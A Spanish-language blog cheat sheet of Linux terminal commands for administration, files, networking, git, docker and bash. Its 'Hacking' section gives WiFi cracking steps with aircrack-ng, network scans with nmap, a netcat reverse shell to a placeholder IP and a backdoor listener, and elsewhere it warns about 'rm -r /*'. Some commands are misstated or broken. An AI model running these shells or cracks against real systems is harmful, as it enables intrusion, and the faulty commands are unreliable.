# Una lista de comandos favoritos en la terminal de Linux, por Ro

Privilegios absolutos (root)

```su```

Si el usuario pertenece al grupo de administradores

```sudo -i``` 

Actualizar 

 ```
 sudo -i
 apt update -y
 apt upgrade -y
 apt autoremove -y
 ```
o

``` apt update -y && apt upgrade -y && apt autoremove -y```

Crear usuario

```sudo useradd nombreusuario```

Para agregar usuarios a grupos, por ejemplo, grupo sudo

```sudo usermod -aG sudo nombreusuario```

Eliminar usuario

```sudo userdel nombreusuario```

Ver usuarios y detalles del host

```
users
hostnamectl
```

Para cambiar la contraseña utilizamos:

```passwd```

Para el root, utilizamos:

```sudo passwd root```

Para ver los grupos a los que pertenece el usuario

```group nombreusuario``` 

Para saber el nombre del host

```hostname```
 
Para cambiar el nombre

```hostnamectl set-hostname nuevonombre```

Instalar todo tipo de programas en Linux, por ejemplo, htop: 

```sudo apt install htop -y```

Instala programas con snap (```apt install snapd```), por ejemplo, VScode, Android Studio y VLC:

```
snap install code --classic
snap install android-studio --classic
snap install vlc --classic
```

Crear un USB bootable con cualquier imagen de Linux.  

 ```sudo dd bs=4M if=***.iso of=/dev/sdb status=progress```

Crear y navegar a las carpetas

```
mkdir carpeta
cd /carpeta 
```

Regresar al directorio anterior

 ```cd ..```

Saber el directorio en el que estamos

```pwd```

Limpiar la pantalla en la terminal

``` clear # o Crtl-L```

Ver la historia del terminal

```history```

Mostrar toda la estructura de los ficheros:

```tree```

Montar USB externo

```sudo mount -rw /dev/sd* /carpeta```

Crear un archivo vacio:

 ```touch nombrearchivo```
 
Crear un archivo con un texto corto:

``` echo "Texto corto" > nombrearchivo ```

Si utilizamos >> agregamos el texto sin reemplazar el archivo. 

``` echo "Agregamos texto nuevo" >> nombrearchivo```

Si queremos aplicar un comando a un archivo, por ejemplo, un sript mysql, usamos "<" 

```mariadb --user=root --password -s < mariadb.sql```

Para echar un ojo a un archivo corto:

 ```
 cat archivo
 more archivo
 less archivo
 ```
 
Con el editor nano podemos ver y editar archivos más grandes:

 ```nano nombrearchivo```
 
Utilizando Crlt-x guardamos los cambios. 

Copiar archivos de un sitio a otro:

 ```cp carpeta/archivo carpeta/```
 
Crear copia con nuevo nombre

``` cp archivo nuevoarchivo ```

Renombrar archivos (no guarda la copia anterior)

``` mv archivo nuevoarchivo```

Listar archivos 

```
ls
ls -l 
```
Para mover archivos seguimos el mismo razonamiento que al copiar. Mientras que si es una carpeta debemos agregar -r.

``` mv -r carpeta/ /carpeta/destino ```

Mover todos los archivos de una carpeta a otra

```mv -r carpeta/* /destino/```

Para eliminar archivos y carpetas:
 ```
 rm nombrearchivo
 rm -r /carpeta
 
```
Cuidado, ```#sudo rm -r /*```  destroza nuestro sistema, elimina todo

Crear links a archivos es sencillo, por ejemplo, al "```archivo1```":

```link archivo1 archivo2```

Opcionalemente podemos utilizar:

```ln archivo1 archivo2```

Para crear links a directorios o entre particiones

```ln -s /dir1 archivos```

Para saber dispositivos conectados a los puertos USB:

```lsusb```
 
Ver las conexiones en los sockets de nuestro equipo

```
ss
ss -l
ss | grep tcp
ss -t -a 
```

IP local y Wifi.

```
 ifconfig
 ip address
 iwconfig
```

IP pública

```curl https://ipinfo.io/ip```

Ruta

```route```
 

Enviar peticiones a servidores online o en red local

```
ping google.com
ping 192.168.1.1
```
 
Usuario y tiempo conectado
```
uname -r
uptime -p
```

Almacenamiento de los discos

 ``df``
 
Si queremos saber donde está un dispositivo USB, disco duro y sus particiones:

 ```sudo fdisk -l```

Ejecutar Scripts de Bash, Python, R o JavaScript:

```
 bash archivo.sh
 python archivo.py
 Rscript archivo.R
 node archivo.js
 ```
Los procesos del sistema pueden mostrarse con:

```
 top
 htop
 ps -ef | less
 ```
El signo | nos permite concatenar comandos (pipes).

Imprimir todos los procesos en un momento determinado

```ps -ef```

Detalles del Hardware y bios del sistema

```dmidecode```

Con neofetch podemos ver detalles de nuestro sistema de manera divertida (```apt install neofetch```)

 ```neofetch```
 
Descomprimir archivos
 
 ```
 unzip *.zip
 gunzip example.txt.gz
 ```

Instalación de aplicaciones .deb. Tambien es posible usar ```gdebi```. 

``` dpkg -i archivo.deb && apt install -f```

Los siguientes comandos utilizan systemctl para controlar servicios del sistema.
```
 systemctl enable nombreservicio
 systemctl start nombreservicio
 systemctl stop nombreservicio
 systemctl disable nombreservicio
```
Reiniciar Wifi 

```service network-manager restart```

Detener proceso 

 ```
 top
 kill idproceso
 ```

Características del sistema

```
 lshw
 lscpu
 ```
 
Browser en terminal

``` elinks https://medium.com/learn-love-code/how-to-set-up-your-professional-data-science-environment-6df74eb06aa4 ```

## Comandos comunes que siempre olvido.

Ver lista de fuentes 

```nano /etc/apt/sources.list```

Controlar los permisos para la accesibilidad de los archivos y carpetas de nuestro sistema, 
```
# por ejemplo, dar todo tipo de acceso a un archivo:
 sudo chmod 777 nombrearchivo
 sudo chmod a+rwx nombrearchivo
 #O para que solamente root pueda acceder a ellos:
 sudo chmod 700 nombrearchivo
```
Acceso a carpeta para todos los usuarios:
```chmod ugo+rwx nombrecarpeta```

Cambiar el 'owner' de /u y subdirectorios del usuario "root". Útil para acceder a archivos "READ-ONLY"

```sudo chown -hR root /u```    

## Encontrar palabras con ``grep`` o ``egrep``
```
touch example
ls | egrep example

```
Buscar palabra en archivo

``look texto archivo`` o ``grep texto archivo``

 Encontrar después de patrón:
```
 echo "field1 field2 field3 field4" | grep -oP '(?<=field3 )[^ ]*'
```
Antes del patrón:
```
echo "field1 field2 field3 field4" | grep -oP '(?<=field2 )\w+'
```

## Información de la red 
 
 IP del proveedor de Internet
 
 ``` grep nameserver  /etc/resolv.conf | awk '{print $2}'```
 
 IP del servidor local
 
 ```ip route show |grep default | awk '{print $3}' | cut -d$'\n' -f1```
 
 IP local del dispositivo
 
 ```ip address show $interface | grep "inet " | awk '{print $2}'```

## Manejo de archivos y Data Mining

Para listar los archivos que tengan un patrón, por ejemplo, que terminen en .iso. 

 ```ls | grep *.iso```
 
Para saber el número de archivos en una carpeta:

``` ls | wc -l```

Conocer la cantidad de filas en un archivo

```wc -l archivo```


Para acceder a las 10 primeras y últimas filas:

 ```
 head -10 archivo
 tail -10 archivo
 ```

Si el archivo es demasiado grande, podemos separarlo en varias partes, por ejemplo, cinco:

```split -n l/5 archivo x```

Para seleccionar la quinta columna, utilizamos:

```awk '{print $5}' archivo```

Separar columnas en función de un caracter, por ejemplo, dos puntos (:)

 ```cut -d ':' -f1 archivo```

Obtener la primera fila de datos

```sed 1d archivo```

Eliminar la última línea o fila de datos

```sed -i '$ d' archivo```


Cambiar el orden de columnas

```
awk '{ print $3, $1 }' archivo.txt

ps -ef | awk -F " " '{print $2}' 
```

Cortar una sección intermedia de filas
```sed -n '250, 260p' archivo1.txt > archivo2.txt```

Para buscar archivos

```
sudo apt-get install mlocate
locate -i archivo
```

## Programas importantes

### Wget 

Descargar archivos desde la terminal, por ejemplo, instalador de RStudio para Debian 10 y Ubuntu 19. 

 ```wget https://download1.rstudio.org/desktop/bionic/amd64/rstudio-1.2.5001-amd64.deb```

Para descargar archivos de un servidor o website. 

```wget -A pdf,csv,txt,png,jpg -m -p -E -k -K -np www.programandoconro.wordpress.com```

Descargar el index.html y los links asociados al website.

```wget -rpk www.programandoconro.wordpress.com```

### Git

Para descargar un repositorios Git:

 ```git clone https://github.com/progamandoconro/My-Lynux-Locker```
 
Para actualizar el repositorio local a partir de GitHub:

 ```git pull origin master```
 
Los commits y los push también pueden realizarse de esta manera o directamente en GitHub. 

```
git add .
git diff --cached
git commit -m 'comment'
git push -u origin master
git checkout -b 'robranch' #o (git switch robranch)
git push origin robranch
git branch -a
```
Más opciones y comandos de git: 
```
git init
git config --global user.name "Your Name Comes Here"
git config --global user.email you@yourdomain.example.com
git status
git log
git log -p
git log --stat --summary
git help -a 
git help -g
```

Tutorial de git

```git help tutorial```

### Docker (o Podman)

``` 
docker run -it ubuntu 
docker images

```
Dockerfile:

```
FROM
MAINTAINER
LABEL
COPY
ADD
RUN
EXPOSE
CMD
ENTRYPOINT
```

```
docker build . -t example  
docker run example
docker ps
docker exec $ID bash
docker inspect $ID
docker network ls
```

Docker-compose
```
docker-compose up
docker-compose start
docker-compose stop
```

### Tor 

Para navegar de manera anónima.  Simplemente descárgalo de https://www.torproject.org y: 

 ```
 tar -xvJf tor-browser-linux64-9.0.4_en-US.tar.xz 
 ./tor-browser_en-US/Browser/start-tor-browser &
 ```

 ### Anaconda
 ```
 conda create -n my_env python=3.7 anaconda
 conda create -n r_env r-essentials r-base
#Creados estos tres ambientes, podemos activar alguno con:

conda activate r_env
#Y ver las sesiones creadas con:

 conda info --envs
#Para instalar modulos de Python, por ejemplo, face_recognition, utilizamos conda o pip:

 conda install face_recognition # (o pip install face_recognition)
 
 ```
 
### Descargar videos
 
```
youtube-dl $url
# solamente audio
youtube-dl --extract-audio --format mp3 
# Ver los formatos disponibles 
youtube-dl -F $url
```
### Cambiar formato .avi a .mp4

```ffmpeg -i input.avi -strict -2 output.mp4```

### VLC para controlar la música desde la línea de comandos. 

 ```
 cvlc /music
 # para ver opciones de control:
 vlc --help
 ```
 
### Juegos en Terminal
 
 ```
 apt-get install bastet moon-buggy ninvaders nsnake pacman4console neofetch figlet -y
 bastet
 moon-buggy
 figlet HOLA AMIGO 
 ``` 
 El próximo comando te hará sentir en la matrix. (apt install cmatrix)
 
 ```cmatrix```
 
 ```telnet towel.blinkenlights.nl``` 
 
Factores en la terminal ```factor 12```
 
Voltea la palabra que introduzcas ```rev``` agrega 123, por ejemplo. 

Repite un mensaje ``yes Viva Linux!!``
 
Provocar sonidos en el computador (apt install beep / yum install beep) ```beep -f 4000 -D 500 -l 100 -r 100``

También se puede hacer un banner, sencillamente: ``banner hola``

Instalar nuevos themes e íconos

```
apt search shell-theme # o dnf en Fedora
apt search icon-theme

apt install ... # dnf install ... 
```
## COMANDOS NIVEL INTERMEDIO 

Buscar paquetes que contienen algun comando que requerimos

```apt search comando``` #(o ```yum search comando```)

Para ejecutar scripts al iniciar el sistema
```
cd ~
sudo nano .bashrc
# Escribe el script
./script
```
Listar las aplicaciones desktop

```ls /usr/share/applications | awk -F '.desktop' ' { print $1}' -```

Tiempo de procesos

```
echo "sudo apt update -y" > myUpdate.sh 
time bash myUpdate.sh
```
 Esperar 10 segundos. 

```sleep 10```

 Programar tareas

```
rm -f /var/run/crond.pid #delete pid
cron 00 00 *** myUpdate.sh #todos los dias a las 12
````
Cambiar el tamaño de las fuente en terminal. 
```dpkg-reconfigure console-setup```

Kill procesos en un socket determinado

```sudo lsof -t -i tcp:8000 | xargs kill -9```

Asignar "alias" a comandos, por ejemplo:

```alias python=python3```

Formatear USB:

``` 
fdisk -l # encontramos el dispositivo, por ejemplo sdc1.
umount /dev/sdc1
sudo mkfs -t vfat /dev/sdc1
``` 

Controlar luz de la pantalla:

```
echo 8 > /sys/class/backlight/intel_backlight/brightness
```

## Hacking:

### Nmap 

(```apt install nmap```)

```
nmap localhost

# Para evaluar la red local entera:
nmap 192.168.1.1/24 #(o 192.168.0.1/24)

#filtrar por puerto y estado 
nmap -Pn 192.168.1.1/24 -p22 -open  

# Auditar 
nmap -Pn **PublicIP**/24 
```

### SSH

Conectar

 ``` ssh usuario@servidor.local```
 
 o 
 
 ```ssh usuario@IP```
 
 Conectar SSH sin password
 
 ```
 ssh-keygen
 ssh-copy-id -i ~/.ssh/id_rsa.pub usuario@servidor.local
 ```

Compartir archivos

```scp nombrearchivo mi@servidor.local:~```

Bloquear IPs que intenten conectar sin permiso

```
iptables -A INPUT -s $IP -j DROP
 ```

 Elegir en cual servidor mostrar el display. 

```
export DISPLAY=:0 # en el servidor local
export DISPLAY=:1 # en el servidor remoto
 ```
 Reverse shell tunneling:
 
 El cliente con Firewall se conecta a la computadora del desarrollador (dev), y envía su shell de manera reversa (``-R--``), creando un túnel.
 
 ``ssh -R 19999:localhost:22 dev@publicIP``
 
 El desarrollador escucha en el puerto 19999 y accede a la computadora del cliente (cli), gracias al túnel abierto.
 
 ``ssh cli@localhost -p 19999``
 
 Redirigir un puerto (ej. 80) de una computadora remota al localhost (ej. 2002):
 
 ``ssh -N -L2002:localhost:80 user@ip_machine``

### Compartir la terminal en el browser

(```apt install tmate``` / ```yum install tmate```)

```tmate```
 
### Modo Monitor de Wifi, Sniffing y Crackeo con aircrack-ng (```apt install aircrack-ng```)
 
 ```
ifconfig wlan1 down
iwconfig wlan1 mode monitor
iwconfig
airdump-ng
airodump-ng -c 1 --bssid XX:XX:XX:XX:XX:XX:XX -w output wlan1
aircrack-ng -b 00:14:6C:7E:40:80 output.cap -w mydiccionary.txt 
```
Escaneo de Redes Wifi Disponibles

``` sudo iwlist wlan0 scan | egrep "Cell|ESSID|Signal|Rates"```

### Ncat:

Reverse Shell:

Desarrollador escucha en puerto 4444

``` nc -lvp 4444 ```

Cliente envía su Shell a la IP del desarrollador

```nc **IP** 4444 -e /bin/sh```

Backdoor

Ejecutar en el servidor remoto

```nc -L -p 3001 -d -e cmd.exe```

Servidor web inseguro

```while : ; do ( echo -ne "HTTP/1.1 200 OK\r\n" ; cat index.html; ) | nc -l -p 8080 ; done```

Chat
```
nc -l -vv -p 5000
nc 192.168.56.1 5000
```
Enviar archivo (inseguro)

```
Receptor escucha:
nc -l -p 9999 > test.txt

El otro lado envía:
nc 192.168.0.1 9999 < test.txt
```

Enviar archivo via ncat por tunel ssh (Seguro)

```
nc myDocument.pdf | ssh me.myserver.com nc -l -p 20000
# cliente
nc me.myserver.com 20000 > myDocument.pdf

 ```
### Script al iniciar el sistema (boot).

```
sudo crontab -e
# Add line to file (here a python script):
@reboot python3 /home/pi/Desktop/exemple.py &
```

## IOT

Dispositivos conectados USB por conexión serial. Ubicarlo es sencillo con:

 ```dmesg | grep ttyUSB```
 
Podemos usar rshell y repl para acceder al dispositivo

 ``` rshell -p /dev/ttyUSB* && repl```
 
Para interactuar con el dispositivo, podemos usar:

```
 ampy --port /dev/ttyUSB** ls
 ampy --port /dev/ttyUSB** put archivo
 ampy --port /dev/ttyUSB** run archivo
 ampy --port /dev/ttyUSB** rm archivo
```
Temperatura CPU Raspberry Pi

```/opt/vc/bin/vcgencmd measure_temp```
 
Controla el audio:

```amixer scontrols```

Busca el dispositivo y ajustar el volumen 

```amixer sset 'PCM' 100%```

## Programación (Bash Script)

### For 

          for i in {1..10} ; do 
              echo "hola $i"; 
          done

           
            for i in $( ls ); do
                echo item: $i
            done 

            
            for i in `seq 1 10`;
            do
                    echo $i
            done    
            
### While
              
             COUNTER=0
             while [  $COUNTER -lt 10 ]; do
                 echo The counter is $COUNTER
                 let COUNTER=COUNTER+1 
             done
    
### Until
              
             COUNTER=20
             until [  $COUNTER -lt 10 ]; do
                 echo COUNTER $COUNTER
                 let COUNTER-=1
             done
             
### If
             
             if [ hola == hola ]; then
             echo TRUE;
             else 
             echo FALSE;
             fi
             
### Aritmética   

             echo $((((2+2-3)*3)/3))
             
### Funciones

             function chao {
               echo 'Chao amigo!';
               exit;
             }
 
             
###########################################################################

Como despedida ... salir, reiniciar, apagar en 30 min, apagar ahora, respectivamente.

```
 exit
 reboot
 shutdown -h +30
 poweroff -f
 
 ```
 
# Links a Posts Relacionados:

https://programandoconro.wordpress.com/2019/10/02/mis-99-comandos-favoritos-en-gnu-linux/
https://programandoconro.wordpress.com/2020/01/02/10-trucos-en-linux-para-programadores-principiantes/

